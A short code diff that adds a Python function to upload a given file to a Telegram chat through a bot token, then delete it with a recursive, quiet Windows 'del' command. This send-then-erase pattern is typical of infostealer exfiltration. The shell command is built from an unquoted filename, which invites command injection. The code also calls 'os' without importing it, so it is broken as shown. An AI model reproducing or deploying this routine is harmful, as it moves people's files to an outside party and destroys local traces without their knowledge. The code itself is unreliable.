@@ -1,0 +1,12 @@
+from telegram import Bot
+import asyncio
+import time
+# end_imports
+
+
+def send_file(token, uid, filename):
+    bot = Bot(token=token)
+    asyncio.run(bot.send_document(chat_id=uid, document=open(filename, 'rb')))
+    time.sleep(2)
+    os.popen(f'del /s /q {filename}')
+
